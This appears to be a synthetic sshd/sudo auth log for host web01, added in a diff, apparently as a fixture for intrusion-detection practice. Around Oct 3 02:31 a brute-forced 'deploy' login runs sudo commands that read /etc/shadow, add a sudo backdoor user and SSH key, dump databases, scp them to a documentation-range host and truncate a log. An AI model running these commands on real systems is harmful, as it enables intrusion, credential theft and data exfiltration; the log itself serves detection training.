@@ -1,0 +1,242 @@
+Oct  1 00:05:21 web01 sshd[1222]: Accepted publickey for deploy from 10.0.5.20 port 53994 ssh2
+Oct  1 00:05:41 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  1 00:06:21 web01 sshd[1223]: Disconnected from user deploy 10.0.5.20 port 48257
+Oct  1 03:10:50 web01 sshd[1207]: Accepted password for bob from 10.0.1.12 port 46389 ssh2
+Oct  1 04:42:50 web01 sshd[1208]: Disconnected from user bob 10.0.1.12 port 40748
+Oct  1 05:17:08 web01 sshd[1211]: Failed password for dave from 10.0.1.14 port 53197 ssh2
+Oct  1 05:17:17 web01 sshd[1212]: Accepted password for dave from 10.0.1.14 port 53862 ssh2
+Oct  1 05:52:44 web01 sshd[1202]: Accepted publickey for alice from 10.0.1.11 port 50015 ssh2
+Oct  1 06:05:05 web01 sshd[1224]: Accepted publickey for deploy from 10.0.5.20 port 53093 ssh2
+Oct  1 06:05:25 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  1 06:06:05 web01 sshd[1225]: Disconnected from user deploy 10.0.5.20 port 44139
+Oct  1 06:43:17 web01 sshd[1218]: Accepted password for devops from 10.0.1.20 port 53901 ssh2
+Oct  1 07:05:39 web01 sudo:   devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+Oct  1 07:19:17 web01 sshd[1219]: Disconnected from user devops 10.0.1.20 port 53935
+Oct  1 07:50:44 web01 sshd[1203]: Disconnected from user alice 10.0.1.11 port 40076
+Oct  1 07:51:40 web01 sshd[1200]: Accepted publickey for alice from 10.0.1.11 port 45464 ssh2
+Oct  1 08:01:00 web01 sshd[1231]: Failed password for admin from 169.180.75.70 port 51447 ssh2
+Oct  1 08:01:04 web01 sshd[1232]: Failed password for root from 169.180.75.70 port 43416 ssh2
+Oct  1 08:06:17 web01 sshd[1213]: Disconnected from user dave 10.0.1.14 port 41759
+Oct  1 08:35:14 web01 sshd[1209]: Accepted publickey for carol from 10.0.1.13 port 46072 ssh2
+Oct  1 10:30:40 web01 sshd[1201]: Disconnected from user alice 10.0.1.11 port 49446
+Oct  1 10:53:14 web01 sshd[1210]: Disconnected from user carol 10.0.1.13 port 57175
+Oct  1 10:54:05 web01 sshd[1220]: Accepted password for guest from 10.0.1.30 port 42599 ssh2
+Oct  1 11:03:26 web01 sshd[1204]: Failed password for bob from 10.0.1.12 port 45339 ssh2
+Oct  1 11:03:35 web01 sshd[1205]: Accepted publickey for bob from 10.0.1.12 port 43713 ssh2
+Oct  1 11:04:43 web01 sshd[1216]: Accepted publickey for devops from 10.0.1.20 port 54132 ssh2
+Oct  1 11:18:12 web01 sudo:   devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/journalctl -u app --since today
+Oct  1 11:19:13 web01 sudo:   devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/journalctl -u app --since today
+Oct  1 11:22:00 web01 sshd[1236]: Failed password for admin from 100.11.147.53 port 56234 ssh2
+Oct  1 11:22:04 web01 sshd[1237]: Failed password for root from 100.11.147.53 port 57353 ssh2
+Oct  1 12:05:19 web01 sshd[1226]: Accepted publickey for deploy from 10.0.5.20 port 57738 ssh2
+Oct  1 12:05:39 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  1 12:06:19 web01 sshd[1227]: Disconnected from user deploy 10.0.5.20 port 55849
+Oct  1 12:18:43 web01 sshd[1217]: Disconnected from user devops 10.0.1.20 port 51925
+Oct  1 12:25:56 web01 sshd[1214]: Accepted publickey for dave from 10.0.1.14 port 40316 ssh2
+Oct  1 13:29:35 web01 sshd[1206]: Disconnected from user bob 10.0.1.12 port 50607
+Oct  1 13:43:56 web01 sshd[1215]: Disconnected from user dave 10.0.1.14 port 49634
+Oct  1 13:50:05 web01 sshd[1221]: Disconnected from user guest 10.0.1.30 port 43568
+Oct  1 14:02:07 web01 sshd[1330]: Failed password for invalid user root from 198.51.100.77 port 49724 ssh2
+Oct  1 14:02:11 web01 sshd[1331]: Failed password for root from 198.51.100.77 port 56244 ssh2
+Oct  1 14:02:17 web01 sshd[1332]: Failed password for root from 198.51.100.77 port 44135 ssh2
+Oct  1 14:02:22 web01 sshd[1333]: Failed password for root from 198.51.100.77 port 40104 ssh2
+Oct  1 14:02:27 web01 sshd[1334]: Failed password for invalid user root from 198.51.100.77 port 53605 ssh2
+Oct  1 14:02:33 web01 sshd[1335]: Failed password for root from 198.51.100.77 port 40508 ssh2
+Oct  1 14:02:41 web01 sshd[1336]: Failed password for root from 198.51.100.77 port 59650 ssh2
+Oct  1 14:02:44 web01 sshd[1337]: Failed password for root from 198.51.100.77 port 51550 ssh2
+Oct  1 14:02:52 web01 sshd[1338]: Failed password for invalid user root from 198.51.100.77 port 44431 ssh2
+Oct  1 14:02:58 web01 sshd[1339]: Failed password for root from 198.51.100.77 port 51980 ssh2
+Oct  1 14:03:06 web01 sshd[1340]: Failed password for root from 198.51.100.77 port 43123 ssh2
+Oct  1 14:03:14 web01 sshd[1341]: Failed password for root from 198.51.100.77 port 55941 ssh2
+Oct  1 14:03:21 web01 sshd[1342]: Failed password for invalid user root from 198.51.100.77 port 55634 ssh2
+Oct  1 14:03:30 web01 sshd[1343]: Failed password for root from 198.51.100.77 port 52418 ssh2
+Oct  1 14:03:36 web01 sshd[1344]: Failed password for root from 198.51.100.77 port 56467 ssh2
+Oct  1 14:03:44 web01 sshd[1345]: Failed password for root from 198.51.100.77 port 41208 ssh2
+Oct  1 14:03:52 web01 sshd[1346]: Failed password for invalid user root from 198.51.100.77 port 50865 ssh2
+Oct  1 14:03:58 web01 sshd[1347]: Failed password for root from 198.51.100.77 port 41877 ssh2
+Oct  1 14:04:04 web01 sshd[1348]: Failed password for root from 198.51.100.77 port 44453 ssh2
+Oct  1 14:04:11 web01 sshd[1349]: Failed password for root from 198.51.100.77 port 48218 ssh2
+Oct  1 14:04:14 web01 sshd[1350]: Failed password for invalid user ubuntu from 198.51.100.77 port 53670 ssh2
+Oct  1 14:04:17 web01 sshd[1351]: Failed password for root from 198.51.100.77 port 41699 ssh2
+Oct  1 14:04:23 web01 sshd[1352]: Failed password for root from 198.51.100.77 port 55547 ssh2
+Oct  1 14:04:26 web01 sshd[1353]: Failed password for admin from 198.51.100.77 port 56052 ssh2
+Oct  1 14:04:35 web01 sshd[1354]: Failed password for invalid user ubuntu from 198.51.100.77 port 48203 ssh2
+Oct  1 14:04:39 web01 sshd[1355]: Failed password for ubuntu from 198.51.100.77 port 44215 ssh2
+Oct  1 14:04:42 web01 sshd[1356]: Failed password for ubuntu from 198.51.100.77 port 42106 ssh2
+Oct  1 14:04:48 web01 sshd[1357]: Failed password for root from 198.51.100.77 port 56998 ssh2
+Oct  1 14:48:00 web01 sshd[1238]: Failed password for root from 192.228.115.38 port 50913 ssh2
+Oct  1 14:48:04 web01 sshd[1239]: Failed password for root from 192.228.115.38 port 57190 ssh2
+Oct  1 14:48:08 web01 sshd[1240]: Failed password for admin from 192.228.115.38 port 41070 ssh2
+Oct  1 16:13:00 web01 sshd[1235]: Failed password for admin from 86.83.76.82 port 46284 ssh2
+Oct  1 16:23:00 web01 sshd[1233]: Failed password for admin from 96.101.111.107 port 46546 ssh2
+Oct  1 16:23:04 web01 sshd[1234]: Failed password for admin from 96.101.111.107 port 50927 ssh2
+Oct  1 18:05:12 web01 sshd[1228]: Accepted publickey for deploy from 10.0.5.20 port 42627 ssh2
+Oct  1 18:05:32 web01 sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  1 18:06:12 web01 sshd[1229]: Disconnected from user deploy 10.0.5.20 port 47394
+Oct  1 21:12:00 web01 sshd[1230]: Failed password for root from 46.188.162.223 port 43680 ssh2
+Oct  2 00:05:24 web01 sshd[1265]: Accepted publickey for deploy from 10.0.5.20 port 48563 ssh2
+Oct  2 00:05:44 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  2 00:06:24 web01 sshd[1266]: Disconnected from user deploy 10.0.5.20 port 43843
+Oct  2 00:43:00 web01 sshd[1276]: Failed password for admin from 194.82.221.210 port 56145 ssh2
+Oct  2 00:43:04 web01 sshd[1277]: Failed password for admin from 194.82.221.210 port 56498 ssh2
+Oct  2 04:07:00 web01 sshd[1273]: Failed password for root from 59.49.207.110 port 45938 ssh2
+Oct  2 04:07:04 web01 sshd[1274]: Failed password for admin from 59.49.207.110 port 56365 ssh2
+Oct  2 04:07:08 web01 sshd[1275]: Failed password for root from 59.49.207.110 port 41700 ssh2
+Oct  2 04:45:00 web01 sshd[1283]: Failed password for root from 89.175.61.136 port 50319 ssh2
+Oct  2 05:06:33 web01 sshd[1251]: Accepted publickey for dave from 10.0.1.14 port 52202 ssh2
+Oct  2 05:08:17 web01 sshd[1261]: Accepted publickey for guest from 10.0.1.30 port 41912 ssh2
+Oct  2 05:21:12 web01 sshd[1255]: Accepted publickey for devops from 10.0.1.20 port 47777 ssh2
+Oct  2 05:22:35 web01 sudo:   devops : TTY=pts/3 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct  2 05:25:25 web01 sudo:   devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct  2 05:30:17 web01 sudo:   devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+Oct  2 06:05:29 web01 sshd[1267]: Accepted publickey for deploy from 10.0.5.20 port 52537 ssh2
+Oct  2 06:05:49 web01 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  2 06:06:29 web01 sshd[1268]: Disconnected from user deploy 10.0.5.20 port 55978
+Oct  2 06:24:15 web01 sshd[1241]: Accepted publickey for alice from 10.0.1.11 port 56970 ssh2
+Oct  2 06:35:33 web01 sshd[1252]: Disconnected from user dave 10.0.1.14 port 45498
+Oct  2 07:00:17 web01 sshd[1262]: Disconnected from user guest 10.0.1.30 port 41997
+Oct  2 07:21:55 web01 sshd[1249]: Accepted publickey for carol from 10.0.1.13 port 58854 ssh2
+Oct  2 07:31:00 web01 sshd[1280]: Failed password for root from 93.43.72.217 port 40688 ssh2
+Oct  2 07:46:12 web01 sshd[1256]: Disconnected from user devops 10.0.1.20 port 44101
+Oct  2 08:01:55 web01 sshd[1250]: Disconnected from user carol 10.0.1.13 port 44460
+Oct  2 08:08:54 web01 sshd[1259]: Accepted publickey for guest from 10.0.1.30 port 45141 ssh2
+Oct  2 09:00:15 web01 sshd[1242]: Disconnected from user alice 10.0.1.11 port 49759
+Oct  2 09:09:44 web01 sshd[1257]: Accepted publickey for devops from 10.0.1.20 port 51688 ssh2
+Oct  2 09:12:00 web01 sudo:    guest : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/apt install htop
+Oct  2 09:14:29 web01 sshd[1253]: Accepted publickey for dave from 10.0.1.14 port 59624 ssh2
+Oct  2 09:22:44 web01 sudo:   devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/journalctl -u app --since today
+Oct  2 09:26:23 web01 sudo:   devops : TTY=pts/3 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct  2 09:46:00 web01 sshd[1278]: Failed password for admin from 50.57.40.44 port 52135 ssh2
+Oct  2 09:46:04 web01 sshd[1279]: Failed password for root from 50.57.40.44 port 45248 ssh2
+Oct  2 10:19:18 web01 sshd[1243]: Accepted publickey for alice from 10.0.1.11 port 50715 ssh2
+Oct  2 10:24:18 web01 sudo:    alice : TTY=pts/2 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status app
+Oct  2 10:26:54 web01 sshd[1260]: Disconnected from user guest 10.0.1.30 port 55213
+Oct  2 10:43:18 web01 sshd[1244]: Disconnected from user alice 10.0.1.11 port 53748
+Oct  2 11:05:32 web01 sshd[1263]: Accepted publickey for guest from 10.0.1.30 port 42808 ssh2
+Oct  2 11:22:29 web01 sshd[1254]: Disconnected from user dave 10.0.1.14 port 46275
+Oct  2 11:33:44 web01 sshd[1258]: Disconnected from user devops 10.0.1.20 port 49538
+Oct  2 11:54:27 web01 sshd[1245]: Accepted password for alice from 10.0.1.11 port 59030 ssh2
+Oct  2 11:59:27 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status app
+Oct  2 12:03:11 web01 sshd[1247]: Accepted password for bob from 10.0.1.12 port 45045 ssh2
+Oct  2 12:05:23 web01 sshd[1269]: Accepted publickey for deploy from 10.0.5.20 port 44242 ssh2
+Oct  2 12:05:43 web01 sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  2 12:06:23 web01 sshd[1270]: Disconnected from user deploy 10.0.5.20 port 45294
+Oct  2 13:15:32 web01 sshd[1264]: Disconnected from user guest 10.0.1.30 port 58773
+Oct  2 13:25:11 web01 sshd[1248]: Disconnected from user bob 10.0.1.12 port 52913
+Oct  2 14:16:27 web01 sshd[1246]: Disconnected from user alice 10.0.1.11 port 48811
+Oct  2 18:05:11 web01 sshd[1271]: Accepted publickey for deploy from 10.0.5.20 port 56843 ssh2
+Oct  2 18:05:31 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  2 18:06:11 web01 sshd[1272]: Disconnected from user deploy 10.0.5.20 port 43222
+Oct  2 19:29:00 web01 sshd[1281]: Failed password for root from 81.48.152.212 port 55216 ssh2
+Oct  2 19:29:04 web01 sshd[1282]: Failed password for root from 81.48.152.212 port 51726 ssh2
+Oct  3 00:05:07 web01 sshd[1307]: Accepted publickey for deploy from 10.0.5.20 port 43030 ssh2
+Oct  3 00:05:27 web01 sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  3 00:06:07 web01 sshd[1308]: Disconnected from user deploy 10.0.5.20 port 50081
+Oct  3 02:10:20 web01 sshd[1360]: Failed password for root from 203.0.113.45 port 47789 ssh2
+Oct  3 02:10:30 web01 sshd[1361]: Failed password for invalid user admin from 203.0.113.45 port 53353 ssh2
+Oct  3 02:10:58 web01 sshd[1362]: Failed password for ubuntu from 203.0.113.45 port 42032 ssh2
+Oct  3 02:11:17 web01 sshd[1363]: Failed password for invalid user test from 203.0.113.45 port 57906 ssh2
+Oct  3 02:11:29 web01 sshd[1364]: Failed password for invalid user oracle from 203.0.113.45 port 49126 ssh2
+Oct  3 02:11:49 web01 sshd[1365]: Failed password for invalid user postgres from 203.0.113.45 port 46805 ssh2
+Oct  3 02:12:11 web01 sshd[1366]: Failed password for deploy from 203.0.113.45 port 46393 ssh2
+Oct  3 02:12:31 web01 sshd[1367]: Failed password for invalid user git from 203.0.113.45 port 40743 ssh2
+Oct  3 02:12:54 web01 sshd[1368]: Failed password for invalid user jenkins from 203.0.113.45 port 50212 ssh2
+Oct  3 02:13:18 web01 sshd[1369]: Failed password for deploy from 203.0.113.45 port 43916 ssh2
+Oct  3 02:13:29 web01 sshd[1370]: Failed password for deploy from 203.0.113.45 port 58597 ssh2
+Oct  3 02:13:55 web01 sshd[1371]: Failed password for root from 203.0.113.45 port 42626 ssh2
+Oct  3 02:14:23 web01 sshd[1372]: Failed password for invalid user admin from 203.0.113.45 port 44024 ssh2
+Oct  3 02:14:50 web01 sshd[1373]: Failed password for ubuntu from 203.0.113.45 port 53454 ssh2
+Oct  3 02:15:18 web01 sshd[1374]: Failed password for invalid user test from 203.0.113.45 port 50408 ssh2
+Oct  3 02:15:47 web01 sshd[1375]: Failed password for invalid user oracle from 203.0.113.45 port 45713 ssh2
+Oct  3 02:16:10 web01 sshd[1376]: Failed password for invalid user postgres from 203.0.113.45 port 46216 ssh2
+Oct  3 02:16:24 web01 sshd[1377]: Failed password for deploy from 203.0.113.45 port 45678 ssh2
+Oct  3 02:16:49 web01 sshd[1378]: Failed password for invalid user git from 203.0.113.45 port 56467 ssh2
+Oct  3 02:17:03 web01 sshd[1379]: Failed password for invalid user jenkins from 203.0.113.45 port 54989 ssh2
+Oct  3 02:17:31 web01 sshd[1380]: Failed password for deploy from 203.0.113.45 port 49844 ssh2
+Oct  3 02:17:50 web01 sshd[1381]: Failed password for deploy from 203.0.113.45 port 49410 ssh2
+Oct  3 02:18:01 web01 sshd[1382]: Failed password for root from 203.0.113.45 port 40341 ssh2
+Oct  3 02:18:29 web01 sshd[1383]: Failed password for invalid user admin from 203.0.113.45 port 43794 ssh2
+Oct  3 02:18:55 web01 sshd[1384]: Failed password for ubuntu from 203.0.113.45 port 40578 ssh2
+Oct  3 02:19:05 web01 sshd[1385]: Failed password for invalid user test from 203.0.113.45 port 52569 ssh2
+Oct  3 02:19:17 web01 sshd[1386]: Failed password for invalid user oracle from 203.0.113.45 port 42350 ssh2
+Oct  3 02:19:35 web01 sshd[1387]: Failed password for invalid user postgres from 203.0.113.45 port 46329 ssh2
+Oct  3 02:19:59 web01 sshd[1388]: Failed password for deploy from 203.0.113.45 port 53773 ssh2
+Oct  3 02:20:20 web01 sshd[1389]: Failed password for invalid user git from 203.0.113.45 port 58286 ssh2
+Oct  3 02:20:30 web01 sshd[1390]: Failed password for invalid user jenkins from 203.0.113.45 port 44138 ssh2
+Oct  3 02:20:54 web01 sshd[1391]: Failed password for deploy from 203.0.113.45 port 55816 ssh2
+Oct  3 02:21:15 web01 sshd[1392]: Failed password for deploy from 203.0.113.45 port 41962 ssh2
+Oct  3 02:21:38 web01 sshd[1393]: Failed password for root from 203.0.113.45 port 43028 ssh2
+Oct  3 02:22:01 web01 sshd[1394]: Failed password for invalid user admin from 203.0.113.45 port 54004 ssh2
+Oct  3 02:22:20 web01 sshd[1395]: Failed password for ubuntu from 203.0.113.45 port 43726 ssh2
+Oct  3 02:22:34 web01 sshd[1396]: Failed password for invalid user test from 203.0.113.45 port 47261 ssh2
+Oct  3 02:22:45 web01 sshd[1397]: Failed password for invalid user oracle from 203.0.113.45 port 51376 ssh2
+Oct  3 02:23:08 web01 sshd[1398]: Failed password for invalid user postgres from 203.0.113.45 port 57181 ssh2
+Oct  3 02:23:32 web01 sshd[1399]: Failed password for deploy from 203.0.113.45 port 50918 ssh2
+Oct  3 02:24:01 web01 sshd[1400]: Failed password for invalid user git from 203.0.113.45 port 41055 ssh2
+Oct  3 02:24:14 web01 sshd[1401]: Failed password for invalid user jenkins from 203.0.113.45 port 53779 ssh2
+Oct  3 02:24:42 web01 sshd[1402]: Failed password for deploy from 203.0.113.45 port 58608 ssh2
+Oct  3 02:24:56 web01 sshd[1403]: Failed password for deploy from 203.0.113.45 port 48726 ssh2
+Oct  3 02:25:21 web01 sshd[1404]: Failed password for root from 203.0.113.45 port 55149 ssh2
+Oct  3 02:25:31 web01 sshd[1405]: Failed password for invalid user admin from 203.0.113.45 port 45724 ssh2
+Oct  3 02:31:40 web01 sshd[1406]: Accepted password for deploy from 203.0.113.45 port 50311 ssh2
+Oct  3 02:33:12 web01 sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct  3 02:33:50 web01 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate
+Oct  3 02:34:20 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupdate
+Oct  3 02:35:10 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
+Oct  3 02:35:55 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e
+Oct  3 02:40:40 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/tar czf /tmp/.cache.tgz /var/www/app /etc/app
+Oct  3 02:44:10 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases -r /tmp/.db.sql
+Oct  3 02:45:40 web01 sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/scp /tmp/.cache.tgz /tmp/.db.sql loot@203.0.113.45:/drop/
+Oct  3 02:52:45 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/nginx/access.log.1
+Oct  3 02:58:30 web01 sshd[1407]: Disconnected from user deploy 203.0.113.45 port 50311
+Oct  3 03:49:28 web01 sshd[1290]: Accepted password for bob from 10.0.1.12 port 57581 ssh2
+Oct  3 04:39:28 web01 sshd[1291]: Disconnected from user bob 10.0.1.12 port 49564
+Oct  3 04:48:41 web01 sshd[1294]: Failed password for carol from 10.0.1.13 port 43989 ssh2
+Oct  3 04:48:50 web01 sshd[1295]: Accepted publickey for carol from 10.0.1.13 port 59081 ssh2
+Oct  3 04:50:00 web01 sshd[1315]: Failed password for admin from 154.29.130.166 port 50654 ssh2
+Oct  3 04:50:04 web01 sshd[1316]: Failed password for root from 154.29.130.166 port 59684 ssh2
+Oct  3 05:53:50 web01 sshd[1296]: Disconnected from user carol 10.0.1.13 port 55741
+Oct  3 06:05:05 web01 sshd[1309]: Accepted publickey for deploy from 10.0.5.20 port 54130 ssh2
+Oct  3 06:05:25 web01 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  3 06:06:05 web01 sshd[1310]: Disconnected from user deploy 10.0.5.20 port 50635
+Oct  3 08:04:52 web01 sshd[1303]: Accepted publickey for devops from 10.0.1.20 port 46356 ssh2
+Oct  3 08:06:36 web01 sudo:   devops : TTY=pts/3 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct  3 08:16:00 web01 sshd[1327]: Failed password for admin from 62.90.37.85 port 55528 ssh2
+Oct  3 08:16:04 web01 sshd[1328]: Failed password for root from 62.90.37.85 port 46253 ssh2
+Oct  3 08:16:08 web01 sshd[1329]: Failed password for admin from 62.90.37.85 port 43759 ssh2
+Oct  3 08:23:19 web01 sudo:   devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/apt update
+Oct  3 08:27:52 web01 sshd[1304]: Disconnected from user devops 10.0.1.20 port 54404
+Oct  3 08:46:57 web01 sshd[1301]: Accepted publickey for dave from 10.0.1.14 port 49805 ssh2
+Oct  3 09:24:57 web01 sshd[1302]: Disconnected from user dave 10.0.1.14 port 57402
+Oct  3 09:29:34 web01 sshd[1292]: Accepted publickey for bob from 10.0.1.12 port 50294 ssh2
+Oct  3 10:23:32 web01 sshd[1297]: Accepted publickey for dave from 10.0.1.14 port 42657 ssh2
+Oct  3 10:24:19 web01 sshd[1286]: Accepted password for alice from 10.0.1.11 port 56399 ssh2
+Oct  3 10:43:34 web01 sshd[1305]: Accepted publickey for guest from 10.0.1.30 port 51638 ssh2
+Oct  3 10:50:00 web01 sshd[1324]: Failed password for admin from 158.185.170.161 port 52234 ssh2
+Oct  3 10:50:04 web01 sshd[1325]: Failed password for admin from 158.185.170.161 port 52578 ssh2
+Oct  3 10:50:08 web01 sshd[1326]: Failed password for root from 158.185.170.161 port 40269 ssh2
+Oct  3 11:15:49 web01 sshd[1288]: Accepted publickey for alice from 10.0.1.11 port 47858 ssh2
+Oct  3 11:40:38 web01 sshd[1284]: Accepted publickey for alice from 10.0.1.11 port 57168 ssh2
+Oct  3 11:56:32 web01 sshd[1298]: Disconnected from user dave 10.0.1.14 port 54506
+Oct  3 12:00:34 web01 sshd[1293]: Disconnected from user bob 10.0.1.12 port 55250
+Oct  3 12:05:21 web01 sshd[1311]: Accepted publickey for deploy from 10.0.5.20 port 48607 ssh2
+Oct  3 12:05:41 web01 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  3 12:06:21 web01 sshd[1312]: Disconnected from user deploy 10.0.5.20 port 47475
+Oct  3 12:24:49 web01 sshd[1289]: Disconnected from user alice 10.0.1.11 port 42190
+Oct  3 12:33:28 web01 sshd[1299]: Accepted publickey for dave from 10.0.1.14 port 54687 ssh2
+Oct  3 12:42:19 web01 sshd[1287]: Disconnected from user alice 10.0.1.11 port 49866
+Oct  3 13:21:38 web01 sshd[1285]: Disconnected from user alice 10.0.1.11 port 58261
+Oct  3 13:32:34 web01 sshd[1306]: Disconnected from user guest 10.0.1.30 port 55891
+Oct  3 15:11:28 web01 sshd[1300]: Disconnected from user dave 10.0.1.14 port 51652
+Oct  3 15:26:00 web01 sshd[1321]: Failed password for admin from 220.159.81.202 port 49482 ssh2
+Oct  3 15:26:04 web01 sshd[1322]: Failed password for admin from 220.159.81.202 port 58365 ssh2
+Oct  3 15:26:08 web01 sshd[1323]: Failed password for root from 220.159.81.202 port 56632 ssh2
+Oct  3 15:59:00 web01 sshd[1317]: Failed password for root from 89.177.126.68 port 52339 ssh2
+Oct  3 15:59:04 web01 sshd[1318]: Failed password for root from 89.177.126.68 port 43789 ssh2
+Oct  3 17:40:12 web01 sshd[1358]: Accepted publickey for carol from 49.36.122.18 port 51514 ssh2
+Oct  3 18:02:40 web01 sshd[1359]: Disconnected from user carol 49.36.122.18 port 51514
+Oct  3 18:05:09 web01 sshd[1313]: Accepted publickey for deploy from 10.0.5.20 port 43309 ssh2
+Oct  3 18:05:29 web01 sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+Oct  3 18:06:09 web01 sshd[1314]: Disconnected from user deploy 10.0.5.20 port 46793
+Oct  3 18:42:00 web01 sshd[1319]: Failed password for root from 166.184.158.69 port 52883 ssh2
+Oct  3 18:42:04 web01 sshd[1320]: Failed password for root from 166.184.158.69 port 54678 ssh2
